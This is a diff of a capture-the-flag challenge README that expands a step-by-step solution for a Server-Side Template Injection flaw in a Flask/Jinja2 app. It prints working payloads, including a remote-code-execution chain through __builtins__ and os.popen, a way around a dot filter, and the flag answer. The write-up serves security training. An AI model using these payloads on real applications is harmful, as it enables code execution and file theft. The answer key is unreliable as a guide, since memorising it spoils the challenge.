@@ -47,17 +47,45 @@ python app/app.py
 <details>
 <summary>Click to reveal solution</summary>
 
-This challenge involves a Server-Side Template Injection vulnerability.
+This challenge involves a Server-Side Template Injection vulnerability in a Flask application using Jinja2 templates.
 
-1. Go to the "Leave a Message" page
-2. In the name field, instead of entering a normal name, enter Jinja2 template code such as:
+1. **Identify the vulnerability**: Go to the "Leave a Message" page and test for SSTI by entering template syntax in the name field.
 
-   - `{{7*7}}` - This should render as 49 if the SSTI vulnerability exists
-   - `{{config}}` - To see the Flask configuration
-   - `{{config.items()}}` - To see the configuration as key-value pairs
-   - More advanced payloads can give you remote code execution: `{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('ls')['read']()}}`
-   - Or to directly get the part 1/2 of the flag: `{{request['application']['__globals__']['__builtins__']['__import__']('app')['__dict__']['FLAG']}}`
-   - Then get the 2/2 of the flag: `{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat flag*')['read']()}}`. We use wildcard `*` to bypass blacklisted dot `.`.
+   - Try `{{7*7}}` - If this renders as 49, it confirms the SSTI vulnerability exists
+   - This works because the user input is directly inserted into a template without proper sanitization
 
-3. The flag is: `ETHACK{es_es_ti_ai_ahayahay}`
+2. **Basic enumeration**: Explore the application context to gather information.
+
+   - `{{config}}` - Reveals the Flask configuration
+   - `{{config.items()}}` - Shows configuration as key-value pairs
+   - These work because Jinja2 templates have access to the Flask application context
+
+3. **Working around restrictions**: The application blocks the dot character (`.`), so we must use bracket notation.
+
+   - Instead of `object.attribute`, we use `object['attribute']`
+   - This bypass works because both notations access attributes in Python, but the filter only blocks the dot syntax
+
+4. **Getting remote code execution**: Access Python's built-in functions to execute system commands.
+
+   - `{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('ls')['read']()}}`
+   - This payload works by:
+     - Starting with the `request` object (available in templates)
+     - Accessing the application context
+     - Reaching Python's built-in functions through `__globals__` and `__builtins__`
+     - Using `__import__` to import the `os` module
+     - Executing `ls` command with `popen` and reading the output
+
+5. **Retrieving part 1 of the flag**: Access the FLAG variable stored in the app module.
+
+   - `{{request['application']['__globals__']['__builtins__']['__import__']('app')['__dict__']['FLAG']}}`
+   - This accesses the app module's dictionary to find the FLAG variable defined in the application
+
+6. **Retrieving part 2 of the flag**: Read the flag.txt file from the filesystem.
+
+   - `{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat flag*')['read']()}}`
+   - We use the wildcard `*` to bypass the blacklisted dot `.` in the filename
+
+7. **Combining the flags**: Put both parts together to get the complete flag.
+   - The final flag is: `ETHACK{es_es_ti_ai_ahayahay}`
+
 </details>
